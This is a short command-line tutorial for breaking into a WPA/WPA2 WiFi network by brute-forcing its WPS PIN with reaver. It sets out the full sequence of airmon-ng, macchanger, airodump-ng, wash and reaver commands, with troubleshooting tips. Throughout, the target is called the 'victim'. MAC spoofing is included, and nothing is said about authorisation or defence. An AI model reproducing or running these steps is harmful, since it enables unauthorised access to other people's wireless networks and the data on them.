Run as superuser
You'll need
- AWUS036H
- aircrack-ng
- macchanger
- reaver

 1) Wifi adapter
    Find out how your wifi adapter is called. Run
    # airmon-ng
    I call it $w here.

 2) Start monitor mode
    # airmon-ng start $w
    You might want to killall the processes that might cause problems. But it
    could also work just like that, I haven't tried it. Run
    # airmon-ng stop $w
    to stop monitor mode. See what you have with
    # airmon-ng
    We'll be using mon0 from now on and I call it $m
    Type
    # iwconfig
    for more information
    If you get an error message saying
    > SIOCSIFFLAGS: Operation not possible due to RF-kill
    run
    # rfkill list
    # rfkill unblock wifi

 3) Change MAC addresses (This step can be omitted.)
    Turn off adapters
    # ifconfig $w down
    # ifconfig $m down
    Change MAC to whatever you like, but both adapter need to have the same MAC
    address
    # macchanger -r $w
    # mac=$(ifconfig -a | sed -n "/${w}/{n; s/.*ether \([^ ]*\).*/\1/p}")
    # macchanger -m $mac $m
    Turn the adapters on again
    # ifconfig $w up
    # ifconfig $m up

 4) See what's out there
    # airodump-ng $m
    If TKIP is used as authorisation method, reaver won't work.

 5) Find out if victim is vulnerable
    To crack the wifi password, the wifi needs to have Wi-Fi Protected Setup
    (WPS) enabled. Only this allows the WPA or WPA2 security to be bypassed. If
    WPS is not enabled, you can try a hand-shake with the wifi and then brute-
    force the password (see e.g. https://www.youtube.com/watch?v=OSfz30sr2Xw)
    Let's see if WPS is enabled with
    # wash -i $m
    WPS Locked needs to show "No". Write down the BSSID from your victim, I will
    call it $bssid. You will also need the channel $channel.
    The wash command should list reachable wifis within a few seconds. If it
    produces no output, you might try to create /usr/etc/reaver. See
    https://aur.archlinux.org/packages/reaver/ or
    https://forums.kali.org/showthread.php?89-Problem-with-wash for more
    information.
    If it doesn't work, you can also try to reenable the wireless devices
    # rfkill block wifi
    # rfkill unblock wifi

 6) Crack the WPS pin
    # reaver -i $m -b $bssid -c $channel -a -S -N -vv
    If you get
    > WARNING: Failed to associate with $bssid
    run
    # wash -i $m
    again. If you can't see the victim's wifi, then you might to start all over
    again.
    Reaver needs to try ~11000 pins. If you find the correct pin, you'll have
    the password. This can take anything from seconds to hours.
    If you get an error message
    > [-] Failed to re-initialize interface 'mon0'
    you might have to start all over again. But reaver should have saved the
    progress and be able to continue from where you left off.
